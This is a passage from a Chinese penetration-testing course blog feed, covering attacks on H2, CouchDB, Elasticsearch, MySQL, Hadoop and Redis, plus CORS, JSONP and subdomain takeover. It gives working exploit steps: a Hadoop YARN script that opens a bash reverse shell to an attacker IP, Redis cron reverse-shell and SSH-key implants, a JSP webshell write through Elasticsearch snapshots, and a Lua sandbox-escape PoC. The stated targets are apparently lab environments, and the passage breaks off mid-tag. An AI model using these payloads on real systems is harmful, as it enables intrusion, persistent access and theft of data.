database自带一个Web管理页面，在Spirng开发中，如果我们设置如下选项，即可允许外部用户访问Web管理页面，且没有鉴权：默认端口：</p><p>spring.h2.console.enabled&#x3D;true </p><p>spring.h2.console.settings.web-allow-others&#x3D;true </p><p>利用这个管理页面，我们可以进行JNDI注入攻击，进而在目标环境下执行任意命令。</p><p>1、下载JNDI-Injection-Exploit</p><p><a href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></p><p>2、生成执行RMI Payload-URL</p><p>-C 执行命令 -A 服务器地址</p><p>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C touch &#x2F;tmp&#x2F;success -A 47.94.236.117</p><p>3、填入URL提交执行</p><p>javax.naming.InitialContext</p><p>rmi:&#x2F;&#x2F;47.94.236.117:1099&#x2F;kd1rns</p><h4 id="CouchDB-权限绕过配合RCE-漏洞"><a href="#CouchDB-权限绕过配合RCE-漏洞" class="headerlink" title="#CouchDB-权限绕过配合RCE-漏洞"></a>#CouchDB-权限绕过配合RCE-漏洞</h4><ul><li><p>CouchDB是一个：<br>类似于MongoDB的文档数据库</p><p>支持分布式扩展操作，具有容错机制<br>CouchDB对数据库的操作，主要都是通过http接口来操作的，也提供了一个web管理面板</p></li></ul><p>复现链接：(<a href="https://blog.csdn.net/YouthBelief/article/details/121144202">https://blog.csdn.net/YouthBelief/article/details/121144202</a>)</p><p>默认端口：5984</p><p>Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）</p><p>-CouchDB-权限绕过-CVE-2017-12635</p><p>1、先创建用户</p><p>Post:&#x2F;_users&#x2F;org.couchdb.user:vulhub</p><p>{<br>  “type”: “user”,<br>  “name”: “vulhub”,<br>  “roles”: [“_admin”],<br>  “roles”: [],<br>  “password”: “vulhub”</p><p>}</p><p>2、登录用户授权</p><p>Get:&#x2F;_utils&#x2F;</p><p>vulhub vulhub</p><p>-CouchDB-权限绕过RCE-CVE-2017-12636</p><p>1、下载exp.py</p><p>2、修改目标和反弹地址</p><p>3、Python3调用执行即可</p><p><a href="https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/exp.py">https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/exp.py</a></p><h4 id="ElasticSearch-文件写入-amp-RCE-漏洞"><a href="#ElasticSearch-文件写入-amp-RCE-漏洞" class="headerlink" title="#ElasticSearch-文件写入&amp;RCE-漏洞"></a>#ElasticSearch-文件写入&amp;RCE-漏洞</h4><p><strong>Elasticsearch</strong>是一个<strong>基于Lucene的搜索服务器</strong>。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口。<strong>Elasticsearch</strong>是用Java语言开发的，并作为Apache许可条款下的开放源码发布，是一种流行的企业级搜索引擎。</p><p>复现链接：(<a href="https://blog.csdn.net/m0_58434634/article/details/117338428">https://blog.csdn.net/m0_58434634/article/details/117338428</a>)</p><p>默认端口：9200 9300</p><p>-Elasticsearch RCE CVE-2014-3120</p><p>1、漏洞需要es中至少存在一条数据，所以我们需要先创建一条数据</p><p><code>POST /website/blog/ HTTP/1.1</code><br><code>Host: your-ip:9200</code><br><code>Accept: */*</code><br><code>Accept-Language: en</code><br><code>User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</code><br><code>Connection: close</code><br><code>Content-Type: application/x-www-form-urlencoded</code><br><code>Content-Length: 25</code></p><p><code>&#123;</code></p><p>  <code>&quot;name&quot;: &quot;xiaodi&quot;</code></p><p><code>&#125;</code></p><p>接发包触发执行命令</p><p>-Elasticsearch 文件写入 wooyun_2015_110216</p><p>9200一般为ElasticSearch的常用端口，此漏洞环境需要与中间件使用</p><p>1、发现9200端口存在elasticsearch页面，8080存在tomcat目录</p><p>2、利用ElasticSearch写入后门到&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;wwwroot&#x2F;</p><p>curl -XPOST <a href="http://123.58.236.76:31556/yz.jsp/yz.jsp/1">http://123.58.236.76:31556/yz.jsp/yz.jsp/1</a> -d’</p><p>{“&lt;%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]{47,116,101,115,116,46,106,115,112})),new String(new byte[]{114,119})).write(request.getParameter(new String(new byte[]{102})).getBytes());%&gt;”:”test”}</p><p>‘</p><p>curl -XPUT ‘<a href="http://123.58.236.76:31556/_snapshot/yz.jsp">http://123.58.236.76:31556/_snapshot/yz.jsp</a>‘ -d ‘{</p><p>​     “type”: “fs”,</p><p>​     “settings”: {</p><p>​          “location”: “&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;wwwroot&#x2F;“,</p><p>​          “compress”: false</p><p>​     }</p><p>}’</p><p>curl -XPUT “<a href="http://123.58.236.76:31556/_snapshot/yz.jsp/yz.jsp">http://123.58.236.76:31556/_snapshot/yz.jsp/yz.jsp</a>“ -d ‘{</p><p>​     “indices”: “yz.jsp”,</p><p>​     “ignore_unavailable”: “true”,</p><p>​     “include_global_state”: false</p><p>}’</p><p>3、访问8080端口snapshot-yz.jsp文件写入代码到test.jsp中</p><p><a href="http://123.58.236.76:31557/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=success">http://123.58.236.76:31557/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=success</a></p><p><a href="http://123.58.236.76:31557/wwwroot/test.jsp">http://123.58.236.76:31557/wwwroot/test.jsp</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;知识点：&quot;&gt;&lt;a href=&quot;#知识点：&quot; class=&quot;headerlink&quot; title=&quot;#知识点：&quot;&gt;&lt;/a&gt;#知识点：&lt;/h3&gt;&lt;p&gt;1、服务攻防-数据库类型安全&lt;/p&gt;
&lt;p&gt;2、influxdb-未授权访问-jwt验证&lt;/p&gt;
&lt;p&gt;3、H2data</summary>
      
    
    
    
    <category term="服务攻防" scheme="http://example.com/categories/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/"/>
    
    
  </entry>
  
  <entry>
    <title>Day55 服务攻防-数据库安全&amp;Redis&amp;Hadoop&amp;Mysql&amp;未授权访问&amp;RCE</title>
    <link href="http://example.com/2023/03/10/Day55-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8-Redis-Hadoop-Mysql-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-RCE/"/>
    <id>http://example.com/2023/03/10/Day55-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8-Redis-Hadoop-Mysql-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-RCE/</id>
    <published>2023-03-10T11:38:43.000Z</published>
    <updated>2023-03-11T06:40:58.990Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/../images/Day55-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8-Redis-Hadoop-Mysql-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-RCE/NGp7SONN1KZIu0bK_GC_Ww.png" alt="img"></p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、服务攻防-数据库类型安全</p><p>2、Redis&amp;Hadoop&amp;Mysql安全</p><p>3、Mysql-CVE-2012-2122漏洞</p><p>4、Hadoop-配置不当未授权三重奏&amp;RCE漏洞</p><p>3、Redis-配置不当未授权三重奏&amp;RCE两漏洞</p><h3 id="章节内容："><a href="#章节内容：" class="headerlink" title="#章节内容："></a>#章节内容：</h3><p>常见服务应用的安全测试：</p><p>1、配置不当-未授权访问</p><p>2、安全机制-特定安全漏洞</p><p>3、安全机制-弱口令爆破攻击</p><h3 id="前置知识："><a href="#前置知识：" class="headerlink" title="#前置知识："></a>#前置知识：</h3><p>应用服务安全测试流程：见图</p><p>1、判断服务开放情况-端口扫描&amp;组合应用等</p><p>2、判断服务类型归属-数据库&amp;文件传输&amp;通讯等</p><p>3、判断服务利用方式-特定漏洞&amp;未授权&amp;弱口令等</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><h4 id="下列复现参过程链接：-https-blog-csdn-net-m0-63917373-article-details-128115706"><a href="#下列复现参过程链接：-https-blog-csdn-net-m0-63917373-article-details-128115706" class="headerlink" title="下列复现参过程链接：(https://blog.csdn.net/m0_63917373/article/details/128115706)"></a>下列复现参过程链接：(<a href="https://blog.csdn.net/m0_63917373/article/details/128115706">https://blog.csdn.net/m0_63917373/article/details/128115706</a>)</h4><p>➢ Mysql-未授权访问-CVE-2012-2122利用</p><p>➢ Hadoop-未授权访问-内置配合命令执行RCE</p><p>➢ Redis-未授权访问-Webshell&amp;任务&amp;密匙&amp;RCE等</p><h4 id="Mysql-未授权访问-CVE-2012-2122利用"><a href="#Mysql-未授权访问-CVE-2012-2122利用" class="headerlink" title="#Mysql-未授权访问-CVE-2012-2122利用"></a>#Mysql-未授权访问-CVE-2012-2122利用</h4><p>受影响版本：</p><ul><li>MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23 are not.</li><li>MySQL versions from 5.1.63, 5.5.24, 5.6.6 are not.</li></ul><p>msf漏洞检测：利用此漏洞需要知道mysql用户名</p><p>msf:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search CVE-2012-2122</span><br><span class="line">use auxiliary/scanner/mysql/mysql_authbypass_hashdump</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.154.3</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>复现环境：vulhub 内置端口33067</p><p>linux下执行命令：（利用for循环去做验证）</p><p>for i in <code>seq 1 1000</code>; do mysql -uroot -pwrong -h <strong>your-ip</strong> -P3306 ; done</p><p><img src="/../images/Day55-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8-Redis-Hadoop-Mysql-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-RCE/image-20230310204235777.png" alt="image-20230310204235777"></p><p>mysql默认只能本地访问（除非存在phpmyadmin）：</p><p><img src="/../images/Day55-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8-Redis-Hadoop-Mysql-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-RCE/image-20230310205541082.png" alt="image-20230310205541082"></p><h4 id="Hadoop-未授权访问-内置配合命令执行RCE"><a href="#Hadoop-未授权访问-内置配合命令执行RCE" class="headerlink" title="#Hadoop-未授权访问-内置配合命令执行RCE"></a>#Hadoop-未授权访问-内置配合命令执行RCE</h4><p><img src="/../images/Day55-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8-Redis-Hadoop-Mysql-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-RCE/image-20230310205909725.png" alt="image-20230310205909725"></p><p>复现环境：vulfocuss</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">target = <span class="string">&#x27;http://123.58.236.76:31361/&#x27;</span></span><br><span class="line">lhost = <span class="string">&#x27;47.94.236.117&#x27;</span> <span class="comment"># put your local host ip here, and listen at port 9999</span></span><br><span class="line"></span><br><span class="line">url = target + <span class="string">&#x27;ws/v1/cluster/apps/new-application&#x27;</span></span><br><span class="line">resp = requests.post(url)</span><br><span class="line">app_id = resp.json()[<span class="string">&#x27;application-id&#x27;</span>]</span><br><span class="line">url = target + <span class="string">&#x27;ws/v1/cluster/apps&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">​    <span class="string">&#x27;application-id&#x27;</span>: app_id,</span><br><span class="line">​    <span class="string">&#x27;application-name&#x27;</span>: <span class="string">&#x27;get-shell&#x27;</span>,</span><br><span class="line">​    <span class="string">&#x27;am-container-spec&#x27;</span>: &#123;</span><br><span class="line">​        <span class="string">&#x27;commands&#x27;</span>: &#123;</span><br><span class="line">​            <span class="string">&#x27;command&#x27;</span>: <span class="string">&#x27;/bin/bash -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1&#x27;</span> % lhost,</span><br><span class="line">​        &#125;,</span><br><span class="line">​    &#125;,</span><br><span class="line">​    <span class="string">&#x27;application-type&#x27;</span>: <span class="string">&#x27;YARN&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url, json=data)</span><br></pre></td></tr></table></figure><h4 id="Redis-未授权访问-Webshell-amp-任务-amp-密匙-amp-RCE等"><a href="#Redis-未授权访问-Webshell-amp-任务-amp-密匙-amp-RCE等" class="headerlink" title="#Redis-未授权访问-Webshell&amp;任务&amp;密匙&amp;RCE等"></a>#Redis-未授权访问-Webshell&amp;任务&amp;密匙&amp;RCE等</h4><p>bind 127.0.0.1未开启，支持远程登录，未设置密码，未开启保护</p><h5 id="1、写Webshell-需得到Web路径"><a href="#1、写Webshell-需得到Web路径" class="headerlink" title="1、写Webshell 需得到Web路径"></a>1、写Webshell 需得到Web路径</h5><p>利用条件：Web目录权限可读写</p><p>config set dir &#x2F;tmp            #设置WEB写入目录</p><p>config set dbfilename 1.php    #设置写入文件名</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">set test <span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>  <span class="comment">#设置写入文件代码</span></span><br></pre></td></tr></table></figure><p>bgsave                         #保存执行</p><p>save                           #保存执行</p><p>注意：部分没目录权限读写权限               </p><h5 id="2、写定时任务反弹shell"><a href="#2、写定时任务反弹shell" class="headerlink" title="2、写定时任务反弹shell"></a>2、写定时任务反弹shell</h5><p>利用条件：</p><p>允许异地登录</p><p>安全模式protected-mode处于关闭状态</p><p>config set dir &#x2F;var&#x2F;spool&#x2F;cron</p><p>set yy “\n\n\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.94.236.117&#x2F;5555 0&gt;&amp;1\n\n\n”</p><p>config set dbfilename x</p><p>save</p><p>注意：</p><p>centos会忽略乱码去执行格式正确的任务计划 </p><p>而ubuntu并不会忽略这些乱码，所以导致命令执行失败</p><h5 id="3、写入Linux-ssh-key公钥"><a href="#3、写入Linux-ssh-key公钥" class="headerlink" title="3、写入Linux ssh-key公钥"></a>3、写入Linux ssh-key公钥</h5><p>利用条件：</p><p>允许异地登录</p><p>Redis服务使用ROOT账号启动</p><p>安全模式protected-mode处于关闭状态</p><p>允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器</p><p>ssh-keygen -t rsa</p><p>cd &#x2F;root&#x2F;.ssh&#x2F;</p><p>(echo -e “\n\n”; cat id_rsa.pub; echo -e “\n\n”) &gt; key.txt</p><p>cat key.txt | redis-cli -h 118.31.57.214 -x set xxx</p><p>config set dir &#x2F;root&#x2F;.ssh&#x2F;</p><p>config set dbfilename authorized_keys</p><p>save</p><p>cd &#x2F;root&#x2F;.ssh&#x2F;</p><p>ssh -i id_rsa <a href="mailto:&#114;&#111;&#x6f;&#x74;&#x40;&#x31;&#x31;&#x38;&#x2e;&#x33;&#49;&#x2e;&#x35;&#x37;&#46;&#x32;&#49;&#52;">&#114;&#111;&#x6f;&#x74;&#x40;&#x31;&#x31;&#x38;&#x2e;&#x33;&#49;&#x2e;&#x35;&#x37;&#46;&#x32;&#49;&#52;</a></p><h5 id="4、RCE自动化利用脚本-vulfocus"><a href="#4、RCE自动化利用脚本-vulfocus" class="headerlink" title="4、RCE自动化利用脚本-vulfocus"></a>4、RCE自动化利用脚本-vulfocus</h5><p><a href="https://github.com/vulhub/redis-rogue-getshell">https://github.com/vulhub/redis-rogue-getshell</a></p><p>python redis-master.py -r 123.58.236.76 -p 11820 -L 47.94.236.117 -P 8888 -f RedisModulesSDK&#x2F;exp.so -c “id”</p><h5 id="5-新漏洞-沙箱绕过RCE-CVE-2022-0543-vulfocus"><a href="#5-新漏洞-沙箱绕过RCE-CVE-2022-0543-vulfocus" class="headerlink" title="5.新漏洞-沙箱绕过RCE CVE-2022-0543-vulfocus"></a>5.新漏洞-沙箱绕过RCE CVE-2022-0543-vulfocus</h5><p>Poc：执行id命令</p><p>eval ‘local io_l &#x3D; package.loadlib(“&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;liblua5.1.so.0”, “luaopen_io”); local io &#x3D; io_l(); local f &#x3D; io.popen(“id”, “r”); local res &#x3D; f:read(“*a”); f:close(); return res’ 0</p><p>靶场：Vulhub</p><p>服务器启动后，可以通过以下方法在没有凭据的情况下连接到此服务器：redis-cli -h ip -p port(对方的redis的ip和port)</p><p>本地kali开启docker环境</p><p><img src="/../images/Day55-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8-Redis-Hadoop-Mysql-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-RCE/image-20230311002333400.png" alt="image-20230311002333400"></p><p>攻击机：本地ubuntu</p><p>redis-cli -h 192.168.240.131 -p 6379</p><p><img src="/../images/Day55-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8-Redis-Hadoop-Mysql-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-RCE/image-20230311002545905.png" alt="image-20230311002545905"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/../images/Day55-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8-Redis-Hadoop-Mysql-%E6%9C%A</summary>
      
    
    
    
    <category term="服务攻防" scheme="http://example.com/categories/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/"/>
    
    
  </entry>
  
  <entry>
    <title>Day54 WEB攻防-通用漏洞&amp;跨域CORS资源&amp;JSONP回调&amp;域名接管劫持</title>
    <link href="http://example.com/2023/03/10/Day54-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B7%A8%E5%9F%9FCORS%E8%B5%84%E6%BA%90-JSONP%E5%9B%9E%E8%B0%83-%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1%E5%8A%AB%E6%8C%81/"/>
    <id>http://example.com/2023/03/10/Day54-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B7%A8%E5%9F%9FCORS%E8%B5%84%E6%BA%90-JSONP%E5%9B%9E%E8%B0%83-%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1%E5%8A%AB%E6%8C%81/</id>
    <published>2023-03-10T07:44:32.000Z</published>
    <updated>2023-03-10T11:23:31.730Z</updated>
    
    <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、子域名接管-检测&amp;探针&amp;利用</p><p>2、COSP跨域资源-检测&amp;探针&amp;利用</p><p>3、JSONP跨域回调-检测&amp;探针&amp;利用</p><h3 id="前置知识点："><a href="#前置知识点：" class="headerlink" title="#前置知识点："></a>#前置知识点：</h3><h4 id="同源策略-SOP-“同源”包括三个条件：同协议-同域名-同端口"><a href="#同源策略-SOP-“同源”包括三个条件：同协议-同域名-同端口" class="headerlink" title="同源策略(SOP)-“同源”包括三个条件：同协议 同域名 同端口"></a>同源策略(SOP)-“同源”包括三个条件：同协议 同域名 同端口</h4><p><img src="/../images/Day54-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B7%A8%E5%9F%9FCORS%E8%B5%84%E6%BA%90-JSONP%E5%9B%9E%E8%B0%83-%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1%E5%8A%AB%E6%8C%81/image-20230310155832790.png" alt="image-20230310155832790"></p><p>同源策略限制从一个源加载的文档或脚本与来自另一个源的资源进行交互,这是一个用于隔离潜在恶意文件的关键的安全机制.简单说就是浏览器的一种安全策略。</p><p>虽然同源策略在安全方面起到了很好的防护作用,但也在一定程度上限制了一些前端功能的实现,所以就有了许多跨域的手段。</p><h4 id="子域名接管：（CNAME或者其下面指向域名过期或失效）"><a href="#子域名接管：（CNAME或者其下面指向域名过期或失效）" class="headerlink" title="子域名接管：（CNAME或者其下面指向域名过期或失效）"></a>子域名接管：（CNAME或者其下面指向域名过期或失效）</h4><p>域名解析记录指向域名，对应主机指向了一个当前未在使用或已经删除的特定服务，攻击者通过注册指向域名，从而控制当前域名的控制权，实现恶意软件分发、网络钓鱼&#x2F;鱼叉式网络钓鱼、XSS 、身份验证绕过等。子域名接管不仅仅限于CNAME记录，NS,MX甚至A记录也会受到影响。</p><p>检测项目：</p><p><a href="https://github.com/pwnesia/dnstake">https://github.com/pwnesia/dnstake</a></p><p><a href="https://github.com/anshumanbh/tko-subs">https://github.com/anshumanbh/tko-subs</a></p><p><a href="https://github.com/mhmdiaa/second-order">https://github.com/mhmdiaa/second-order</a></p><p><a href="https://github.com/r3curs1v3-pr0xy/sub404">https://github.com/r3curs1v3-pr0xy/sub404</a></p><p><a href="https://github.com/Echocipher/Subdomain-Takeover">https://github.com/Echocipher/Subdomain-Takeover</a></p><h4 id="COSP跨域资源（同源策略的配置不当）"><a href="#COSP跨域资源（同源策略的配置不当）" class="headerlink" title="COSP跨域资源（同源策略的配置不当）"></a>COSP跨域资源（同源策略的配置不当）</h4><p>CORS全称Cross-Origin Resource Sharing, 跨域资源共享，是HTML5的一个新特性，已被所有浏览器支持，跨域资源共享(CORS)是一种放宽同源策略的机制，它允许浏览器向跨源服务器，发出XMLHttpRequest请求，从而克服了AJAX只能同源使用的限制，以使不同的网站可以跨域获取数据。</p><p>Access-Control-Allow-Origin：指定哪些域可以访问域资源。例如，如果requester.com想要访问provider.com的资源，那么开发人员可以使用此标头安全地授予requester.com对provider.com资源的访问权限。</p><p>Access-Control-Allow-Credentials：指定浏览器是否将使用请求发送cookie。仅当allow-credentials标头设置为true时，才会发送Cookie。</p><p>Access-Control-Allow-Methods：指定可以使用哪些HTTP请求方法（GET，PUT，DELETE等）来访问资源。此标头允许开发人员通过在requester.com请求访问provider.com的资源时，指定哪些方法有效来进一步增强安全性。</p><p>检测项目：<a href="https://github.com/chenjj/CORScanner">https://github.com/chenjj/CORScanner</a></p><h4 id="JSONP跨域回调（在同源策略防护下引用资源回调导致）"><a href="#JSONP跨域回调（在同源策略防护下引用资源回调导致）" class="headerlink" title="JSONP跨域回调（在同源策略防护下引用资源回调导致）"></a>JSONP跨域回调（在同源策略防护下引用资源回调导致）</h4><p>JSONP跨域巧妙的利用了script标签能跨域的特点,实现了json的跨域传输。</p><p>检测项目：手工审查元素筛选或Burp项目</p><p><a href="https://github.com/p1g3/JSONP-Hunter">https://github.com/p1g3/JSONP-Hunter</a></p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ CORS资源跨域-敏感页面源码获取</p><p>➢ JSONP回调跨域-某牙个人信息泄露</p><p>➢ 子域名接管-瓜迪个人子域名劫持接管</p><p>➢ 检测项目-CORS&amp;JSONP&amp;子域名接管</p><h4 id="CORS资源跨域-敏感页面源码获取"><a href="#CORS资源跨域-敏感页面源码获取" class="headerlink" title="#CORS资源跨域-敏感页面源码获取"></a>#CORS资源跨域-敏感页面源码获取</h4><p>cors和csrf的区别</p><p><img src="/../images/Day54-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B7%A8%E5%9F%9FCORS%E8%B5%84%E6%BA%90-JSONP%E5%9B%9E%E8%B0%83-%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1%E5%8A%AB%E6%8C%81/image-20230310160537236.png" alt="image-20230310160537236"></p><p>CORS:设置问题</p><p><img src="/../images/Day54-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B7%A8%E5%9F%9FCORS%E8%B5%84%E6%BA%90-JSONP%E5%9B%9E%E8%B0%83-%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1%E5%8A%AB%E6%8C%81/image-20230310160823095.png" alt="image-20230310160823095"></p><p>复现步骤：</p><p>1、本地搭建访问页面跨域调用URL</p><p><img src="/../images/Day54-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B7%A8%E5%9F%9FCORS%E8%B5%84%E6%BA%90-JSONP%E5%9B%9E%E8%B0%83-%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1%E5%8A%AB%E6%8C%81/image-20230310161107118.png" alt="image-20230310161107118"></p><p>test.php,接收网页源码并生成secrect.html</p><p><img src="/../images/Day54-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B7%A8%E5%9F%9FCORS%E8%B5%84%E6%BA%90-JSONP%E5%9B%9E%E8%B0%83-%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1%E5%8A%AB%E6%8C%81/image-20230310161134410.png" alt="image-20230310161134410"></p><p>2、受害者访问当前页面被资源共享</p><p><img src="/../images/Day54-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B7%A8%E5%9F%9FCORS%E8%B5%84%E6%BA%90-JSONP%E5%9B%9E%E8%B0%83-%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1%E5%8A%AB%E6%8C%81/image-20230310161720469.png" alt="image-20230310161720469"></p><p>本地访问生成的secrect.html 获取到后台源码</p><p><img src="/../images/Day54-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B7%A8%E5%9F%9FCORS%E8%B5%84%E6%BA%90-JSONP%E5%9B%9E%E8%B0%83-%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1%E5%8A%AB%E6%8C%81/image-20230310161512190.png" alt="image-20230310161512190"></p><h4 id="JSONP回调跨域-某牙个人信息泄露"><a href="#JSONP回调跨域-某牙个人信息泄露" class="headerlink" title="#JSONP回调跨域-某牙个人信息泄露"></a>#JSONP回调跨域-某牙个人信息泄露</h4><p><strong>跟CSRF的区别是必须要有回调函数才可以利用</strong></p><p>同源策略可能指显示一部分不限制所有，因为总有需求要调用外部资源，如支付接口</p><p><img src="/../images/Day54-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B7%A8%E5%9F%9FCORS%E8%B5%84%E6%BA%90-JSONP%E5%9B%9E%E8%B0%83-%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1%E5%8A%AB%E6%8C%81/image-20230310162408810.png" alt="image-20230310162408810"></p><p>黑盒找：</p><p><img src="/../images/Day54-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B7%A8%E5%9F%9FCORS%E8%B5%84%E6%BA%90-JSONP%E5%9B%9E%E8%B0%83-%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1%E5%8A%AB%E6%8C%81/image-20230310162752490.png" alt="image-20230310162752490"></p><p>复现步骤：</p><p>1、登录某牙找到回调有敏感信息</p><p>本地搜索回调函数callback，找到有信息泄露的url地址</p><p><img src="/../images/Day54-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B7%A8%E5%9F%9FCORS%E8%B5%84%E6%BA%90-JSONP%E5%9B%9E%E8%B0%83-%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1%E5%8A%AB%E6%8C%81/image-20230310163137153.png" alt="image-20230310163137153"></p><p>2、本地搭建访问页面跨域调用URL</p><p>复制这个地址到本地的</p><p><img src="/../images/Day54-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B7%A8%E5%9F%9FCORS%E8%B5%84%E6%BA%90-JSONP%E5%9B%9E%E8%B0%83-%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1%E5%8A%AB%E6%8C%81/image-20230310163313676.png" alt="image-20230310163313676"></p><p>粘贴到本地的搭建的JSONP接触代码中</p><p><img src="/../images/Day54-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B7%A8%E5%9F%9FCORS%E8%B5%84%E6%BA%90-JSONP%E5%9B%9E%E8%B0%83-%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1%E5%8A%AB%E6%8C%81/image-20230310163450273.png" alt="image-20230310163450273"></p><p>3、对方访问页面可获取当前某牙信息</p><p>当有人访问这个test.html时，会将你在这个平台的个人信息页面的数据包获取到（包含个人的信息）</p><p><img 